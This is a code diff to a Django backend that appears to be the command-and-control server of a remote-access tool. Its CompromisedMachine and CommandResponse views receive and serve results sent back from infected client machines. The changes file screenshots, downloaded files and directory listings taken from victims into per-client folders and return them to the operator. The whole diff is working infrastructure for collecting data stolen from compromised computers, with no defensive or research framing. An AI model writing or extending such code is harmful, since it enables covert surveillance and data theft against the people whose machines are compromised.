@@ -107,7 +107,7 @@ class ClientCommand(APIView):
 
     def get(self, request, client_id):
         try:
-            commands = Command.objects.filter(client=client_id)
+            commands = Command.objects.filter(client=client_id).order_by('-timestamp')
         except Command.DoesNotExist:
             return Response({"error": "Commands not found for this client"}, status=404)
         
@@ -172,17 +172,27 @@ class CompromisedMachine(APIView):
     def save_response(self, data):
         commandid = data.get('id', None)
         response = data.get('response', None)
+        type = data.get('type_', None)
         try:
             clientid = Command.objects.get(id= commandid).client
             client = Client.objects.get(id= clientid)
             root_dir = settings.BASE_DIR  
             
+            
             target_dir = os.path.join(root_dir, f"ClientsData/{client.id}")
+            extension  = "txt"
+            if type == "screenshot":
+                target_dir = os.path.join(target_dir, "screenshots")
+                extension = "txt"  # as base 64
+            elif type == "file":
+                target_dir = os.path.join(target_dir, "files")
+            elif type == "list":
+                target_dir = os.path.join(target_dir, "list")
 
             if not os.path.exists(target_dir):
                 os.makedirs(target_dir)
 
-            file_path = os.path.join(target_dir, f"{commandid}.txt")
+            file_path = os.path.join(target_dir, f"{commandid}.{extension}")
             with open(file_path, "a", encoding="utf-8") as file:
                 file.write(response)
         except Exception as ex:
@@ -232,14 +242,22 @@ class CommandResponse(APIView):
         try:
             command = Command.objects.get(id=id)
             clientid = command.client
-            root_dir = settings.BASE_DIR  
-            target_dir = os.path.join(root_dir, f"ClientsData/{clientid}")
+            root_dir = settings.BASE_DIR 
 
-            file_path = os.path.join(target_dir, f"{command.id}.txt")
+            target_dir = os.path.join(root_dir, f"ClientsData/{clientid}")
+            extension  = "txt"
+            if command.command.startswith("screenshot"):
+                target_dir = os.path.join(target_dir, "screenshots")
+            elif command.command.startswith("download"):
+                target_dir = os.path.join(target_dir, "files") 
+            elif command.command.startswith("list"):
+                target_dir = os.path.join(target_dir, "list")
+
+            file_path = os.path.join(target_dir, f"{command.id}.{extension}")
             with open(file_path, "r", encoding="utf-8") as file:
                 data = file.read()
 
             return Response({'data':data, 'title':id+ " : " +command.result, 'command':command.command}, status=200)
 
         except Exception as ex:
-            return Response({'data':f'No Data Found'}, status=404)
+            return Response({'data':f'No Data Found' , 'title':id+ " : " +command.result}, status=404)
